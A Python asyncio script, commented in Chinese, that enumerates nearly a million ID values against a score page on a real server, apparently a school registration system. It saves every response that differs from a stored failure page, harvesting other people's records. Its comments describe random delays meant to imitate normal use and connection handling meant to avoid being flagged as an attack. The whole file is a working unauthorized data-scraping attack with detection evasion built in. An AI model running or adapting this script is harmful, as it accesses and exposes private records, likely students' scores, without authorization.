import asyncio
import aiohttp
import os
import random

# 設定參數
START_ID = 8526 # 從出錯的地方繼續
END_ID = 1000000
# 大幅降低併發數，避免 500 錯誤。
# 如果伺服器還是報錯，請嘗試降為 1 或 2，或增加 sleep 時間。
CONCURRENCY_LIMIT = 5
# 使用正確存在的基準檔案
REF_FILE_PATH = "python/others/failed.html" 
URL_TEMPLATE = "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2={}"

async def get_ref_content():
    if not os.path.exists(REF_FILE_PATH):
        print(f"錯誤：找不到基準檔案 {REF_FILE_PATH}")
        return None
    with open(REF_FILE_PATH, "rb") as f:
        return f.read()

async def fetch_and_check(session, i, ref_content, semaphore):
    t_str = str(i).zfill(6)
    url = URL_TEMPLATE.format(t_str)
    
    async with semaphore:
        try:
            # 隨機延遲 1-3 秒，模擬正常操作，讓伺服器喘氣
            await asyncio.sleep(random.uniform(1.0, 3.0))
            
            async with session.get(url, timeout=15) as response:
                if response.status != 200:
                    print(f"[-] HTTP {response.status} on {t_str} - 跳過 (等待伺服器恢復)")
                    return

                content = await response.read()
                
                # 檢查是否為 500 錯誤頁面 (即使 status 是 200)
                if b"500 - " in content or b"Internal Server Error" in content:
                     print(f"[-] Server Error content on {t_str}")
                     return

                # 比對內容
                if content != ref_content:
                    # 再次確認長度差異
                    if abs(len(content) - len(ref_content)) < 50: # 容許 50 bytes 的差異 (例如時間戳記不同)
                        pass 
                    else:
                        print(f"[+] 發現不同檔案: {t_str} (Diff: {len(content) - len(ref_content)} bytes)")
                        filename = f"{t_str}.html"
                        with open(filename, "wb") as f:
                            f.write(content)
                
        except Exception as e:
            print(f"[-] Exception on {t_str}: {e}")

async def main():
    ref_content = await get_ref_content()
    if ref_content is None:
        return

    # 使用 Windows 相容的 selector (如果是 Windows)
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    
    # force_close=True 強制每次請求關閉連線，雖然慢一點但能避免被伺服器判定為攻擊
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(force_close=True)) as session:
        tasks = []
        print(f"開始掃描 {START_ID} 到 {END_ID} (Concurrency: {CONCURRENCY_LIMIT})...")
        
        batch_size = 20
        for i in range(START_ID, END_ID):
            task = asyncio.create_task(fetch_and_check(session, i, ref_content, semaphore))
            tasks.append(task)
            
            if len(tasks) >= batch_size:
                await asyncio.gather(*tasks)
                tasks = []
                print(f"目前進度: {i} / {END_ID}")
                await asyncio.sleep(1) # 批次間額外休息

        if tasks:
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
